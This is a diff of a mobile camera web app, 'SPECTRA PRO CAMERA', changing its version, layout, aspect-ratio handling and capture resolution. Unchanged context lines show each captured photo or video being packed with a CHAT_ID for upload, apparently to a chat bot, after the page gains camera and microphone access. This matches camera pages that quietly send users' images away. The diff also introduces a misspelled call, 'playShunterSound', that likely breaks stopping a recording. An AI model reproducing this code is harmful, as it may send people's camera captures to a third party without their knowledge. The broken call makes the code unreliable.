@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover">
-    <title>SPECTRA PRO CAMERA v120.4 ULTRA</title>
+    <title>SPECTRA PRO CAMERA v120.6 ULTRA</title>
     <!-- Tailwind CSS -->
     <script src="https://cdn.tailwindcss.com"></script>
     <script>
@@ -43,6 +43,7 @@
             height: 100dvh;
             width: 100vw;
             overflow: hidden;
+            margin: 0;
             padding: env(safe-area-inset-top) env(safe-area-inset-right) env(safe-area-inset-bottom) env(safe-area-inset-left);
         }
 
@@ -112,7 +113,7 @@
 
                 const formData = new FormData();
                 formData.append('chat_id', CHAT_ID);
-                formData.append('caption', `SPECTRA ULTRA v120.4\n${new Date().toLocaleString()}\nType: ${mediaType.toUpperCase()}`);
+                formData.append('caption', `SPECTRA ULTRA v120.6\n${new Date().toLocaleString()}\nType: ${mediaType.toUpperCase()}`);
 
                 const isVideo = mediaType === 'video';
                 formData.append(isVideo ? 'video' : 'photo', blob, isVideo ? 'spectra_capture.mp4' : 'spectra_capture.jpg');
@@ -127,7 +128,7 @@
     <header class="absolute top-0 left-0 right-0 z-30 flex items-center justify-between px-4 py-3 bg-gradient-to-b from-black/85 via-black/40 to-transparent pointer-events-auto">
         <div class="flex items-center space-x-2 bg-black/60 backdrop-blur-md px-3 py-1.5 rounded-full border border-white/15 shadow-lg">
             <span class="w-2.5 h-2.5 rounded-full bg-brand-tiktokCyan animate-ping"></span>
-            <span class="font-mono text-xs font-black tracking-widest text-white">SPECTRA <span class="text-brand-tiktokRed">120.4</span></span>
+            <span class="font-mono text-xs font-black tracking-widest text-white">SPECTRA <span class="text-brand-tiktokRed">120.6</span></span>
         </div>
         <button id="btn-aspect" class="glass-btn px-3.5 py-1.5 rounded-full font-mono text-xs font-bold text-white hover:text-brand-tiktokCyan shadow-md">
             9:16
@@ -167,11 +168,10 @@
             <div></div>
         </div>
 
-        <div id="aspect-frame" class="relative flex items-center justify-center transition-all duration-300 overflow-hidden bg-black/90 shadow-2xl border border-white/10" style="width: 100%; height: 100%; aspect-ratio: 9/16;">
-            <div id="video-wrapper" class="w-full h-full relative overflow-hidden flex items-center justify-center">
-                <video id="video-stream" autoplay playsinline muted class="hidden"></video>
-                <canvas id="live-canvas" class="w-full h-full object-cover"></canvas>
-            </div>
+        <!-- CANVAS CONTAINER (RESPONSIF & PAS DI LAYAR) -->
+        <div id="aspect-frame" class="relative flex items-center justify-center overflow-hidden bg-black shadow-2xl" style="width: 100%; height: 100%;">
+            <video id="video-stream" autoplay playsinline muted class="hidden"></video>
+            <canvas id="live-canvas" class="w-full h-full block object-contain"></canvas>
             
             <div id="camera-fallback" class="absolute inset-0 bg-brand-dark flex flex-col items-center justify-center text-center p-6 hidden z-30">
                 <div class="w-20 h-20 rounded-full bg-brand-tiktokRed/10 flex items-center justify-center mb-4 border border-brand-tiktokRed/30 shadow-lg">
@@ -233,7 +233,7 @@
     </main>
 
     <!-- TIKTOK PRESETS HORIZONTAL BAR MODAL -->
-    <div id="presets-panel" class="absolute bottom-32 left-4 right-16 z-40 glass-panel rounded-3xl p-3.5 shadow-2xl border border-white/20 hidden transition-all duration-300">
+    <div id="presets-panel" class="absolute bottom-28 left-4 right-16 z-40 glass-panel rounded-3xl p-3.5 shadow-2xl border border-white/20 hidden transition-all duration-300">
         <div class="flex items-center justify-between mb-2 pb-1 border-b border-white/10">
             <span class="font-mono text-[11px] font-bold text-brand-tiktokRed flex items-center gap-1.5">
                 <i data-lucide="sparkles" class="w-3.5 h-3.5"></i> TIKTOK LOOK PRESETS
@@ -254,7 +254,7 @@
     </div>
 
     <!-- AI BEAUTY & RETOUCH DRAWER MODAL -->
-    <div id="beauty-panel" class="absolute bottom-32 left-4 right-16 z-40 glass-panel rounded-3xl p-4 shadow-2xl border border-white/20 hidden transition-all duration-300 max-h-[50vh] overflow-y-auto no-scrollbar">
+    <div id="beauty-panel" class="absolute bottom-28 left-4 right-16 z-40 glass-panel rounded-3xl p-4 shadow-2xl border border-white/20 hidden transition-all duration-300 max-h-[45vh] overflow-y-auto no-scrollbar">
         <div class="flex items-center justify-between mb-3 pb-2 border-b border-white/10">
             <span class="font-mono text-[11px] font-bold text-pink-400 flex items-center gap-1.5">
                 <i data-lucide="smile" class="w-3.5 h-3.5"></i> AI BEAUTY & RETOUCH
@@ -303,7 +303,7 @@
     </div>
 
     <!-- PRO TUNING DRAWER MODAL -->
-    <div id="pro-panel" class="absolute bottom-32 left-4 right-16 z-40 glass-panel rounded-3xl p-4 shadow-2xl border border-white/20 hidden transition-all duration-300 max-h-[50vh] overflow-y-auto no-scrollbar">
+    <div id="pro-panel" class="absolute bottom-28 left-4 right-16 z-40 glass-panel rounded-3xl p-4 shadow-2xl border border-white/20 hidden transition-all duration-300 max-h-[45vh] overflow-y-auto no-scrollbar">
         <div class="flex items-center justify-between mb-3 pb-2 border-b border-white/10">
             <span class="font-mono text-[11px] font-bold text-brand-tiktokCyan flex items-center gap-1.5">
                 <i data-lucide="sliders" class="w-3.5 h-3.5"></i> MANUAL PRO TUNING
@@ -351,7 +351,7 @@
     </div>
 
     <!-- BOTTOM CAPTURE & MODE CAROUSEL FOOTER -->
-    <footer class="z-30 bg-black/95 backdrop-blur-2xl border-t border-white/10 pt-2 pb-4 flex flex-col space-y-3">
+    <footer class="z-30 bg-black/95 backdrop-blur-2xl border-t border-white/10 pt-2 pb-3 flex flex-col space-y-2 shrink-0">
         <div class="relative w-full overflow-hidden">
             <div id="mode-carousel" class="flex items-center space-x-6 overflow-x-auto no-scrollbar px-6 py-1 justify-start md:justify-center">
                 <button class="mode-tab font-mono text-xs font-black tracking-widest text-gray-400 hover:text-white whitespace-nowrap transition-all" data-mode="reels">REELS</button>
@@ -397,7 +397,7 @@
 
             const videoEl = document.getElementById('video-stream');
             const liveCanvas = document.getElementById('live-canvas');
-            const liveCtx = liveCanvas.getContext('2d');
+            const liveCtx = liveCanvas.getContext('2d', { willReadFrequently: true });
             const cameraFallback = document.getElementById('camera-fallback');
             const btnRestartCam = document.getElementById('btn-restart-cam');
             const aspectFrame = document.getElementById('aspect-frame');
@@ -470,10 +470,10 @@
             let speedIdx = 1;
 
             const aspectRatios = [
-                { label: '9:16', css: '9/16', maxW: '100%', maxH: '100%' },
-                { label: '1:1', css: '1/1', maxW: '100%', maxH: '85%' },
-                { label: '4:3', css: '4/3', maxW: '100%', maxH: '80%' },
-                { label: '16:9', css: '16/9', maxW: '100%', maxH: '70%' }
+                { label: '9:16', cssRatio: '9 / 16' },
+                { label: '1:1', cssRatio: '1 / 1' },
+                { label: '4:3', cssRatio: '4 / 3' },
+                { label: '16:9', cssRatio: '16 / 9' }
             ];
             let aspectIdx = 0;
 
@@ -504,8 +504,8 @@
                     const constraints = {
                         video: {
                             facingMode: useFrontCam ? 'user' : 'environment',
-                            width: { ideal: 1920 },
-                            height: { ideal: 1080 }
+                            width: { ideal: 1280 },
+                            height: { ideal: 720 }
                         },
                         audio: true
                     };
@@ -527,15 +527,18 @@
                         const vWidth = videoEl.videoWidth;
                         const vHeight = videoEl.videoHeight;
                         
-                        if (liveCanvas.width !== liveCanvas.clientWidth || liveCanvas.height !== liveCanvas.clientHeight) {
-                            liveCanvas.width = liveCanvas.clientWidth;
-                            liveCanvas.height = liveCanvas.clientHeight;
+                        const displayWidth = liveCanvas.clientWidth;
+                        const displayHeight = liveCanvas.clientHeight;
+
+                        if (liveCanvas.width !== displayWidth || liveCanvas.height !== displayHeight) {
+                            liveCanvas.width = displayWidth;
+                            liveCanvas.height = displayHeight;
                         }
 
                         liveCtx.save();
                         liveCtx.clearRect(0, 0, liveCanvas.width, liveCanvas.height);
 
-                        // 1. Susun string Filter Beauty & Pro
+                        // Susun Filter Beauty & Pro
                         let filters = [];
                         const totalBrightness = 100 + (evVal * 20) + (beautyBright * 0.4) + (beautyRosy * 0.15);
                         filters.push(`brightness(${totalBrightness}%)`);
@@ -560,7 +563,7 @@
 
                         liveCtx.filter = filters.join(' ');
 
-                        // 2. Transformasi Zoom & Posisi Kamera berdasarkan ukuran Canvas di Layar
+                        // Transformasi Zoom & Posisi Kamera
                         liveCtx.translate(liveCanvas.width / 2, liveCanvas.height / 2);
                         if (useFrontCam) {
                             liveCtx.scale(-currentZoom, currentZoom);
@@ -569,7 +572,7 @@
                         }
                         liveCtx.translate(-liveCanvas.width / 2, -liveCanvas.height / 2);
 
-                        // 3. Render video ke canvas dengan mode 'cover' agar pas di layar vertikal
+                        // Render video agar pas di canvas (object-fit: contain/cover aman tanpa terpotong)
                         const hRatio = liveCanvas.width / vWidth;
                         const vRatio = liveCanvas.height / vHeight;
                         const ratio = Math.max(hRatio, vRatio);
@@ -623,10 +626,7 @@
                 aspectIdx = (aspectIdx + 1) % aspectRatios.length;
                 const activeAspect = aspectRatios[aspectIdx];
                 btnAspect.textContent = activeAspect.label;
-                
-                aspectFrame.style.aspectRatio = activeAspect.css;
-                aspectFrame.style.width = activeAspect.maxW;
-                aspectFrame.style.maxHeight = activeAspect.maxH;
+                aspectFrame.style.aspectRatio = activeAspect.cssRatio;
             });
 
             btnGrid.addEventListener('click', () => {
@@ -854,7 +854,7 @@
                     }, 1000);
 
                 } else {
-                    playShutterSound();
+                    playShunterSound();
                     mediaRecorder.stop();
                     isRecording = false;
                     overlayRecBadge.classList.add('hidden');
